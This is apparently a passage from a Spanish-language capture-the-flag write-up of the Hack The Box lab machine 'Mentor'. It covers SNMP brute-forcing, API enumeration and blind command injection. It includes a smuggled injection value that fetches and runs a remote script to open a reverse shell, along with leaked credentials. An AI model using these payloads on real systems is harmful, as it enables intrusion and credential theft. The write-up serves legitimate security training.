Una vez dentro, descubrimos credenciales en la base de datos postgres, con ello logramos acceder a un primer usuario por SSH. Accedimos a un segundo usuario con la configuracion del servicio snmp que, finalmente nos permitio escalar privilegios como root.\nNombre Mentor OS Linux Puntos 30 Dificultad Media IP 10.10.11.193 Maker kavigihan\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.6, 4.9, 4.8, 5.2, 5.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 10, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80), ssh (22) y snmp (161 udp).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # nmap -p$ports -sV -sC 10.10.11.193 -oN nmap_scan Nmap scan report for 10.10.11.193 (10.10.11.193) Host is up (0.083s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA) |_ 256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://mentorquotes.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # nmap -sU -p- --min-rate 10000 10.10.11.193 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 15:30 CST Warning: 10.10.11.193 giving up on port because retransmission cap hit (10). Nmap scan report for mentorquotes.htb (10.10.11.193) Host is up (0.15s latency). Not shown: 65455 open|filtered udp ports (no-response), 79 closed udp ports (port-unreach) PORT STATE SERVICE 161/udp open snmp Nmap done: 1 IP address (1 host up) scanned in 73.58 seconds snmp Ejecutamos sobre el puerto snmp el modulo auxiliar snmp_login de metasploit, con el objetivo de encontrar el \u0026lsquo;community\u0026rsquo; de este servicio, utilizando un wordlist sugerido por este mismo modulo. Al finalizar la ejecucion se muestra que el community es internal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 [msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_login) \u0026gt;\u0026gt; show options Module options (auxiliary/scanner/snmp/snmp_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list DB_SKIP_EXISTING none no Skip existing credentials stored in the current database (Accepted: none, user, user\u0026amp;realm) PASSWORD no The password to test PASS_FILE /usr/share/metasploit-framework/data/wordlists/snmp_default_p no File containing communities, one per line ass.txt RHOSTS 10.10.11.193 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 161 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USER_AS_PASS false no Try the username as the password for all users VERBOSE true yes Whether to print output for all attempts VERSION 2c yes The SNMP version to scan (Accepted: 1, 2c, all) [msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_login) \u0026gt;\u0026gt; [msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_login) \u0026gt;\u0026gt; run [!] No active DB -- Credential data will not be saved! [+] 10.10.11.193:161 - Login Successful: internal (Access level: read-only); Proof (sysDescr.0): Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed [msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_login) \u0026gt;\u0026gt; Utilizamos snmp-check para enumerar la informacion del servicio.\nEl nombre de las interfaces sugieren docker en ejecucion, asi mismo los procesos. Se muestra la ejecucion de uvicorn en ejecucion por el puerto 8000. Observamos la ejecucion de un script en python el cual tiene algun tipo de secret o contraseña como argumento. 1 2 3 4 5 6 [.. snip ..] 2086 runnable postgres postgres: postgres mentorquotes_db 172.22.0.1(41216) idle 2111 runnable login.py /usr/bin/python3 /usr/local/bin/login.py kj23sadkj123as0-d213 2163 unknown kworker/1:1-cgroup_destroy 2304 unknown kworker/u256:0-flush-253:0 [.. snip ..] full output snmp-check\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 ➜ mentor snmp-check -v 2c -c internal 10.10.11.193 snmp-check v1.9 - SNMP enumerator Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org) [+] Try to connect to 10.10.11.193:161 using SNMPv2c and community \u0026#39;internal\u0026#39; [*] System information: Host IP address : 10.10.11.193 Hostname : mentor Description : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64 Contact : Me \u0026lt;admin@mentorquotes.htb\u0026gt; Location : Sitting on the Dock of the Bay Uptime snmp : 00:24:34.54 Uptime system : 00:24:15.33 System date : 2023-1-9 00:50:03.0 [*] Network information: IP forwarding enabled : yes Default TTL : 64 TCP segments received : 2948 TCP segments sent : 2987 TCP segments retrans : 284 Input datagrams : 21674 Delivered datagrams : 12658 Output datagrams : 13646 [*] Network interfaces: Interface : [ up ] lo Id : 1 Mac Address : ::::: Type : softwareLoopback Speed : 10 Mbps MTU : 65536 In octets : 71962 Out octets : 71962 [.. snip ..] Interface : [ up ] docker0 Id : 7 Mac Address : 02:42:65:5c:81:8c Type : ethernet-csmacd Speed : 0 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] br-028c7a43f929 Id : 8 Mac Address : 02:42:b4:98:ef:68 Type : ethernet-csmacd Speed : 0 Mbps MTU : 1500 In octets : 0 Out octets : 0 Interface : [ up ] veth6668ea8 Id : 10 Mac Address : 5a:de:19:b2:ab:c4 Type : ethernet-csmacd Speed : 4294 Mbps MTU : 1500 In octets : 59250 Out octets : 72874 Interface : [ up ] veth1c20142 Id : 12 Mac Address : 12:8e:b3:50:4e:1a Type : ethernet-csmacd Speed : 4294 Mbps MTU : 1500 In octets : 367042 Out octets : 9335026 Interface : [ up ] vethf0772bf Id : 14 Mac Address : ae:38:fd:4d:3e:8c Type : ethernet-csmacd Speed : 4294 Mbps MTU : 1500 In octets : 0 Out octets : 1160 [*] Network IP: Id IP Address Netmask Broadcast 2 10.10.11.193 255.255.254.0 1 1 127.0.0.1 255.0.0.0 0 7 172.17.0.1 255.255.0.0 1 6 172.18.0.1 255.255.0.0 1 3 172.19.0.1 255.255.0.0 1 8 172.20.0.1 255.255.0.0 1 4 172.21.0.1 255.255.0.0 1 5 172.22.0.1 255.255.0.0 1 [*] Routing information: Destination Next hop Mask Metric 0.0.0.0 10.10.10.2 0.0.0.0 1 10.10.10.0 0.0.0.0 255.255.254.0 0 172.17.0.0 0.0.0.0 255.255.0.0 0 172.18.0.0 0.0.0.0 255.255.0.0 0 172.19.0.0 0.0.0.0 255.255.0.0 0 172.20.0.0 0.0.0.0 255.255.0.0 0 172.21.0.0 0.0.0.0 255.255.0.0 0 172.22.0.0 0.0.0.0 255.255.0.0 0 [*] TCP connections and listening ports: Local address Local port Remote address Remote port State 0.0.0.0 22 0.0.0.0 0 listen 10.10.11.193 46808 8.8.8.8 53 synSent 127.0.0.1 45391 0.0.0.0 0 listen 127.0.0.53 53 0.0.0.0 0 listen 172.22.0.1 81 0.0.0.0 0 listen 172.22.0.1 5432 0.0.0.0 0 listen 172.22.0.1 5432 172.22.0.3 33920 established 172.22.0.1 5432 172.22.0.3 33932 established 172.22.0.1 8000 0.0.0.0 0 listen 172.22.0.1 36428 172.22.0.1 8000 closeWait 172.22.0.1 39784 172.22.0.1 8000 timeWait 172.22.0.1 41210 172.22.0.4 5432 established 172.22.0.1 41216 172.22.0.4 5432 established 172.22.0.1 53916 172.22.0.1 8000 closeWait 172.22.0.1 54528 172.22.0.1 8000 timeWait 172.22.0.1 56946 172.22.0.1 8000 timeWait [*] Listening UDP ports: Local address Local port 0.0.0.0 68 0.0.0.0 161 127.0.0.53 53 [*] Processes: Id Status Name Path Parameters 1 runnable systemd /sbin/init 2 runnable kthreadd 3 unknown rcu_gp 4 unknown rcu_par_gp 5 unknown netns 7 unknown kworker/0:0H-events_highpri 9 unknown kworker/0:1H-events_highpri [.. snip ..] 275 unknown cryptd 276 unknown scsi_tmf_31 296 unknown kworker/u256:25-flush-253:0 297 unknown kworker/u256:26-events_power_efficient 338 runnable scsi_eh_32 339 unknown scsi_tmf_32 362 unknown kdmflush 363 unknown kdmflush 395 unknown raid5wq 453 runnable jbd2/dm-0-8 454 unknown ext4-rsv-conver 515 runnable systemd-journal /lib/systemd/systemd-journald 550 unknown kaluad 552 unknown kmpath_rdacd 553 unknown kmpathd 554 unknown kmpath_handlerd 555 runnable multipathd /sbin/multipathd -d -s 560 runnable systemd-udevd /lib/systemd/systemd-udevd 589 runnable systemd-network /lib/systemd/systemd-networkd 650 unknown nfit 748 runnable jbd2/sda2-8 749 unknown ext4-rsv-conver 765 runnable systemd-resolve /lib/systemd/systemd-resolved 766 runnable systemd-timesyn /lib/systemd/systemd-timesyncd 780 runnable VGAuthService /usr/bin/VGAuthService 784 runnable vmtoolsd /usr/bin/vmtoolsd 804 runnable dhclient /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 901 runnable dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 906 runnable irqbalance /usr/sbin/irqbalance --foreground 907 runnable networkd-dispat /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 908 runnable polkitd /usr/libexec/polkitd --no-debug 909 runnable rsyslogd /usr/sbin/rsyslogd -n -iNONE 910 runnable snapd /usr/lib/snapd/snapd 911 runnable systemd-logind /lib/systemd/systemd-logind 912 runnable udisksd /usr/libexec/udisks2/udisksd 934 runnable ModemManager /usr/sbin/ModemManager 1037 unknown kworker/0:4-events 1218 runnable cron /usr/sbin/cron -f -P 1220 running snmpd /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f 1239 runnable agetty /sbin/agetty -o -p -- \\u --noclear tty1 linux 1252 runnable containerd /usr/bin/containerd 1256 runnable sshd sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 1277 runnable apache2 /usr/sbin/apache2 -k start 1278 runnable apache2 /usr/sbin/apache2 -k start 1279 runnable apache2 /usr/sbin/apache2 -k start 1345 runnable dockerd /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 1690 runnable login.sh /bin/bash /usr/local/bin/login.sh 1754 runnable docker-proxy /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432 1768 runnable containerd-shim /usr/bin/containerd-shim-runc-v2 -namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock 1790 runnable postgres postgres 1870 runnable docker-proxy /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000 1886 runnable containerd-shim /usr/bin/containerd-shim-runc-v2 -namespace moby -id 3fae9c57b65874731f9524f5c897b652e33017540baaa48d1858add7cf8ecf05 -address /run/containerd/containerd.sock 1905 runnable python3 python3 -m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000 1914 runnable postgres postgres: checkpointer 1915 runnable postgres postgres: background writer 1916 runnable postgres postgres: walwriter 1917 runnable postgres postgres: autovacuum launcher 1918 runnable postgres postgres: stats collector 1919 runnable postgres postgres: logical replication launcher 1979 runnable docker-proxy /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80 1996 runnable containerd-shim /usr/bin/containerd-shim-runc-v2 -namespace moby -id 0e6eebdd915c52e9bb583a0da3b64ccbe576567da478e5ada865de40e47b37e1 -address /run/containerd/containerd.sock 2017 runnable python python main.py 2034 runnable python3 /usr/local/bin/python3 -c from multiprocessing.semaphore_tracker import main;main(4) 2035 runnable python3 /usr/local/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork 2085 runnable postgres postgres: postgres mentorquotes_db 172.22.0.1(41210) idle 2086 runnable postgres postgres: postgres mentorquotes_db 172.22.0.1(41216) idle 2111 runnable login.py /usr/bin/python3 /usr/local/bin/login.py kj23sadkj123as0-d213 2163 unknown kworker/1:1-cgroup_destroy 2304 unknown kworker/u256:0-flush-253:0 2351 unknown kworker/1:2-events 2431 unknown kworker/0:0-events 2447 unknown kworker/1:0-events 2452 unknown kworker/0:2-events [*] Storage information: Description : [\u0026#34;Physical memory\u0026#34;] Device id : [#\u0026lt;SNMP::Integer:0x00005563d1c5b9a0 @value=1\u0026gt;] Filesystem type : [\u0026#34;unknown\u0026#34;] Device unit : [#\u0026lt;SNMP::Integer:0x00005563d1c59d30 @value=1024\u0026gt;] Memory size : 3.80 GB Memory used : 1.06 GB [.. snip ..] Description : [\u0026#34;/run/snapd/ns\u0026#34;] Device id : [#\u0026lt;SNMP::Integer:0x00005563d1ca9c68 @value=55\u0026gt;] Filesystem type : [\u0026#34;unknown\u0026#34;] Device unit : [#\u0026lt;SNMP::Integer:0x00005563d1ca7eb8 @value=4096\u0026gt;] Memory size : 388.98 MB Memory used : 1.71 MB [*] File system information: Index : noSuchInstance Mount point : noSuchInstance Access : noSuchInstance Bootable : noSuchInstance [*] Device information: Id Type Status Descr 196608 unknown running GenuineIntel: Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz 196609 unknown running GenuineIntel: Intel(R) Xeon(R) Gold 5218 CPU @ 2.30GHz 262145 unknown running network interface lo 262146 unknown running network interface eth0 262147 unknown running network interface br-24ddaa1f3b47 262148 unknown running network interface br-3d63c18e314d 262149 unknown running network interface br-7d5c72654da7 262150 unknown running network interface br-a8a89c3bf6ff 262151 unknown running network interface docker0 262152 unknown running network interface br-028c7a43f929 262154 unknown running network interface veth6668ea8 262156 unknown running network interface veth1c20142 262158 unknown running network interface vethf0772bf 786432 unknown unknown Guessing that there\u0026#39;s a floating point co-processor [*] Software components: Index Name 1 adduser_3.118ubuntu5_all 2 amd64-microcode_3.20191218.1ubuntu2_amd64 3 apache2_2.4.52-1ubuntu4.2_amd64 [.. snip ..] 715 zstd_1.4.8+dfsg-3build1_amd64 ➜ mentor Web Site El sitio web redirige al dominio mentorquotes.htb.\n1 2 3 4 5 6 7 8 ➜ mentor curl -sI 10.10.11.193 HTTP/1.1 302 Found Date: Sun, 08 Jan 2023 20:48:00 GMT Server: Apache/2.4.52 (Ubuntu) Location: http://mentorquotes.htb/ Content-Type: text/html; charset=iso-8859-1 ➜ mentor El sitio muestra una lista de frases.\nDirectory Brute Forcing feroxbuster no muestra alguna otra direccion o directorio del sitio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ➜ mentor feroxbuster -w $MD -u http://mentorquotes.htb/ --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.7.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://mentorquotes.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 167l 621w 5506c http://mentorquotes.htb/ 403 GET 9l 28w 281c http://mentorquotes.htb/server-status api.mentorquotes.htb Con la ejecucion de wfuzz descubrimos el subdominio api.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ➜ mentor wfuzz -c -w bitquark-subdomains-top100000.txt -u http://mentorquotes.htb -H \u0026#34;Host: FUZZ.mentorquotes.htb\u0026#34; --hl 9 2\u0026gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://mentorquotes.htb/ Total requests: 100000 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000040: 404 0 L 2 W 22 Ch \u0026#34;api\u0026#34; 000037212: 400 10 L 35 W 308 Ch \u0026#34;*\u0026#34; Total time: 976.1970 Processed Requests: 100000 Filtered Requests: 99998 Requests/sec.: 102.4383 feroxbuster muestra distintas direcciones del sitio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ➜ mentor feroxbuster -u http://api.mentorquotes.htb/ -w raft-medium-directories.txt --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://api.mentorquotes.htb/ 🚀 Threads │ 50 📖 Wordlist │ raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 2 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 307 0l 0w 0c http://api.mentorquotes.htb/admin 200 31l 62w 969c http://api.mentorquotes.htb/docs 405 1l 3w 31c http://api.mentorquotes.htb/admin/backup 307 0l 0w 0c http://api.mentorquotes.htb/users 307 0l 0w 0c http://api.mentorquotes.htb/quotes WLD 0l 0w 0c Got 307 for http://api.mentorquotes.htb/quotes/d16376eb78e340c5bdc5f0f314aabcf7 (url length: 32) WLD - - - http://api.mentorquotes.htb/quotes/d16376eb78e340c5bdc5f0f314aabcf7 redirects to =\u0026gt; http://api.mentorquotes.htb/quotes/d16376eb78e340c5bdc5f0f314aabcf7/ 405 1l 3w 31c http://api.mentorquotes.htb/users/add 403 9l 28w 285c http://api.mentorquotes.htb/server-status API La direccion /docs nos muestra la documentacion de la API. Ademas se muestra el usuario james como email.\nAuth as James Utilizando la informacion encontrada intentamos logearnos.\nLa respuesta es una cookie.\nApi Utilizando la cookie enumeramos las rutas, vemos en /users/ dos usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ➜ mentor curl -sX GET http://api.mentorquotes.htb/users/ -H \u0026#34;Accept: application/json\u0026#34; -H \u0026#34;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0\u0026#34; | jq [ { \u0026#34;id\u0026#34;: 1, \u0026#34;email\u0026#34;: \u0026#34;james@mentorquotes.htb\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;james\u0026#34; }, { \u0026#34;id\u0026#34;: 2, \u0026#34;email\u0026#34;: \u0026#34;svc@mentorquotes.htb\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;service_acc\u0026#34; } ] ➜ mentor Observamos en la ruta /admin/, la ruta /check y /backup. En backup se muestra que el metodo no esta permitido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ➜ mentor cookie=\u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0\u0026#34; ➜ mentor curl -sX GET http://api.mentorquotes.htb/admin/ -H \u0026#34;Accept: application/json\u0026#34; -H \u0026#34;Authorization: $cookie\u0026#34; | jq { \u0026#34;admin_funcs\u0026#34;: { \u0026#34;check db connection\u0026#34;: \u0026#34;/check\u0026#34;, \u0026#34;backup the application\u0026#34;: \u0026#34;/backup\u0026#34; } } ➜ mentor curl -sX GET http://api.mentorquotes.htb/admin/check -H \u0026#34;Accept: application/json\u0026#34; -H \u0026#34;Authorization: $cookie\u0026#34; | jq { \u0026#34;details\u0026#34;: \u0026#34;Not implemented yet!\u0026#34; } ➜ mentor curl -sX GET http://api.mentorquotes.htb/admin/backup -H \u0026#34;Accept: application/json\u0026#34; -H \u0026#34;Authorization: $cookie\u0026#34; | jq { \u0026#34;detail\u0026#34;: \u0026#34;Method Not Allowed\u0026#34; } ➜ mentor Al intentar con el metodo POST muestra que el parametro body es requerido, al enviarlo, muestra que es necesario el path.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ➜ mentor curl -sX POST http://api.mentorquotes.htb/admin/backup -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;Authorization: $cookie\u0026#34; | jq { \u0026#34;detail\u0026#34;: [ { \u0026#34;loc\u0026#34;: [ \u0026#34;body\u0026#34; ], \u0026#34;msg\u0026#34;: \u0026#34;field required\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;value_error.missing\u0026#34; } ] } ➜ mentor curl -sX POST http://api.mentorquotes.htb/admin/backup -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;Authorization: $cookie\u0026#34; -d \u0026#39;{\u0026#34;body\u0026#34;:\u0026#34;616\u0026#34;}\u0026#39; | jq { \u0026#34;detail\u0026#34;: [ { \u0026#34;loc\u0026#34;: [ \u0026#34;body\u0026#34;, \u0026#34;path\u0026#34; ], \u0026#34;msg\u0026#34;: \u0026#34;field required\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;value_error.missing\u0026#34; } ] } ➜ mentor root - Docker Container Blind Command Injection Al enviar los parametros requeridos muestra \u0026ldquo;Done\u0026rdquo;.\n1 2 3 4 5 ➜ mentor curl -sX POST http://api.mentorquotes.htb/admin/backup -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;Authorization: $cookie\u0026#34; -d \u0026#39;{\u0026#34;body\u0026#34;:\u0026#34;616\u0026#34;, \u0026#34;path\u0026#34;:\u0026#34;/etc/passwd\u0026#34;}\u0026#39; | jq { \u0026#34;INFO\u0026#34;: \u0026#34;Done!\u0026#34; } ➜ mentor Intentamos realizar \u0026lsquo;bypass\u0026rsquo; para ejecutar comandos, en este caso ejecutamos wget, se observa la solicitud realizada a nuestra maquina. Seguramente realiza algun tipo de backup a la direccion dada al archivo con nombre app_backkup.tar.\nShell Ejecutamos shells y modificamos el valor de path para ejecutar una shell inversa.\n1 2 3 4 { \u0026#34;body\u0026#34;:\u0026#34;616\u0026#34;, \u0026#34;path\u0026#34;:\u0026#34;/etc/passwd;$(wget -qO- 10.10.14.207/10.10.14.207:1335|sh)\u0026#34; } Tras realizar la solicitud logramos obtener acceso a la maquina como root. Anteriormente encontramos informacion sobre docker, seguramente obtuvimos acceso a un contenedor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ➜ mentor rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from api.mentorquotes.htb [10.10.11.193] 43032 /bin/sh: can\u0026#39;t access tty; job control turned off /app # which python /usr/local/bin/python /app # python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; Traceback (most recent call last): File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;/usr/local/lib/python3.6/pty.py\u0026#34;, line 156, in spawn os.execlp(argv[0], *argv) File \u0026#34;/usr/local/lib/python3.6/os.py\u0026#34;, line 542, in execlp execvp(file, args) File \u0026#34;/usr/local/lib/python3.6/os.py\u0026#34;, line 559, in execvp _execvpe(file, args) File \u0026#34;/usr/local/lib/python3.6/os.py\u0026#34;, line 583, in _execvpe exec_func(file, *argrest) FileNotFoundError: [Errno 2] No such file or directory /app # whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) /app /app # Encontramos los archivos de la API, entre ellos de la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 /app # ls -lah total 24K drwxr-xr-x 1 root root 4.0K Nov 10 16:00 . drwxr-xr-x 1 root root 4.0K Mar 3 23:29 .. -rw-r--r-- 1 root root 1.0K Jun 12 2022 .Dockerfile.swp -rw-r--r-- 1 root root 522 Nov 3 12:58 Dockerfile drwxr-xr-x 1 root root 4.0K Nov 10 16:00 app -rw-r--r-- 1 root root 672 Jun 4 2022 requirements.txt /app # cd app /app/app # ls -lah total 28K drwxr-xr-x 1 root root 4.0K Nov 10 16:00 . drwxr-xr-x 1 root root 4.0K Nov 10 16:00 .. -rw-r--r-- 1 root root 0 Jun 4 2022 __init__.py drwxr-xr-x 1 root root 4.0K Nov 10 16:00 __pycache__ drwxr-xr-x 1 root root 4.0K Nov 10 16:00 api -rw-r--r-- 1 root root 0 Jun 4 2022 config.py -rw-r--r-- 1 root root 1001 Jun 7 2022 db.py -rw-r--r-- 1 root root 1.1K Jun 4 2022 main.py -rw-r--r-- 1 root root 704 Jun 4 2022 requirements.txt /app/app # /app/app # cat db.py import os from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData) from sqlalchemy.sql import func from databases import Database # Database url if none is passed the default one is used DATABASE_URL = os.getenv(\u0026#34;DATABASE_URL\u0026#34;, \u0026#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\u0026#34;) # SQLAlchemy for quotes engine = create_engine(DATABASE_URL) metadata = MetaData() quotes = Table( \u0026#34;quotes\u0026#34;, metadata, Column(\u0026#34;id\u0026#34;, Integer, primary_key=True), Column(\u0026#34;title\u0026#34;, String(50)), Column(\u0026#34;description\u0026#34;, String(50)), Column(\u0026#34;created_date\u0026#34;, DateTime, default=func.now(), nullable=False) ) # SQLAlchemy for users engine = create_engine(DATABASE_URL) metadata = MetaData() users = Table( \u0026#34;users\u0026#34;, metadata, Column(\u0026#34;id\u0026#34;, Integer, primary_key=True), 